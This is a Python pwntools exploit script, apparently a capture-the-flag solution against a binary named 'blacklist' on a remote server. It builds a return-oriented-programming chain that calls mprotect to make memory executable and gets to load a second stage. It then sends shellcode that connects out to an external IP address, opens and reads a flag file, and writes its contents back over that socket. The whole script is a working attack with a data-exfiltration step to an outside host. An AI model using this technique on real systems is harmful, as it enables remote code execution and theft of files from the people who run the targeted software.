#!/usr/bin/env python3

from pwn import *

exe = ELF("./blacklist_patched")

context.binary = exe


def conn():
    r = process([exe.path])
    return r


def main():
    #r = conn()
    r = remote("40.71.72.198", 1236)
    
    pause()
    
    offset = 0x48
    pop_rdi = 0x00000000004018ca
    pop_rsi = 0x00000000004028b8
    pop_rdx = 0x00000000004017cf

    payload  = b"M"*0x48
    payload += p64(pop_rdi)
    payload += p64(0x00000000004dd000)
    payload += p64(pop_rsi)
    payload += p64(0x4000)
    payload += p64(pop_rdx)
    payload += p64(0x7)
    payload += p64(exe.sym['mprotect'])

    start = 0x4de2a0

    payload += p64(pop_rdi)
    payload += p64(0x00000000004dd000 + 0x12a0)
    payload += p64(exe.sym['gets'])

    payload += p64(pop_rdi)
    payload += p64(0)

    payload += p64(start+0x20) 

    r.sendline(payload)
    

    shellcode = b"/home/fbi/flag.txt".ljust(0x20, p8(0))
    
    shellcode += asm(shellcraft.connect("105.154.96.93", 4445))

    shellcode += asm(f"""
        mov rdi, -100
        mov rsi, {start}
        xor rdx, rdx
        xor r10, r10
        mov rax, 257
        syscall

        mov rdi, rax
        mov rax, 0
        mov rsi, {start+0x1000}
        mov rdx, 0x100
        syscall
        
        // send to the socket we created.
        mov rdi, 0x3
        mov rax, 1
        syscall

    """)

    r.sendline(shellcode)
    
    r.interactive()


if __name__ == "__main__":
    main()
